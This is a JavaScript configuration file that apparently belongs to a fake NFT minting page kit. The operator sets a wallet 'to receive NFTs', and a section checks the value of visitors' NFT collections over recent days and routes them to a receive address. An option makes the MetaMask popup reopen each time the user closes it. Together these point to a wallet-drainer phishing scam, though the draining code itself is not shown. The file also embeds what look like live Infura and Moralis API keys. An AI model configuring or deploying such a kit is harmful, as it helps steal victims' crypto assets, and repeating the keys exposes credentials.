// ⚠️ for infura & moralis, make you sure that you copy same number of characters
const address = "0xCa2b719F96592D0Cb5bFA28259238E9e92dd14F6";    // Your ETH wallet that you have to receive NFTs
const infuraId = "4b67a4204634491b8b7eabc3e4458749"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
const moralisApi = "ovFtP7MTQ46h1HxjlOiY8P7Ab31oSzBPkpTz6hfsV2XrXj2QuCY8LrOgjjBDOw2A"    // Web3 Api key | https://moralis.io/ | For NFTs

const collectionInfo = {
    name: "Tec.sellix.io",
    title: "Tec MINT Template", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    date: "XX.XX.XXXX", // Today date
    socialMedia: {
        discord: "https://discord.gg/example",
        twitter: "https://twitter.com/example",
    },
    medias: {
        preview: "preview.gif",
        favicon: "logo.png",
    },
    background: {
        type: "image",              // Supported types: image, video, color
        image: "background.jpg",    // Image for image type, video preview for video type
        video: "background.mp4",    // If you don't use video, you can ignore this line
        color: "#4E4E6D",           // If you don't use color, you can ignore this line
    }
}
const mintInfo = {
    price: 0.0001,         // Price per NFT.
    totalSupply: 999,   // Total supply of NFTs.
    minUnits: 1,        // Min units to buy.
    maxUnits: 6,        // Max units to buy.
    askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
}

const nftsInfo = {
    active: true,   // Active (true) or not (false) NFTs.
    minValue: 0.001,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    checkMaxDay: 7, // Maximum number of days to check for the last transactions.
    receiveAddress: "" // leave empty if you want to use the same address 
}

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!address.startsWith("0x") ||
    (
        address.length >= 64 ||
        address.length <= 40
    )
) console.error(`Error: ${address} is not a valid Ethereum address.`);
//#endregion
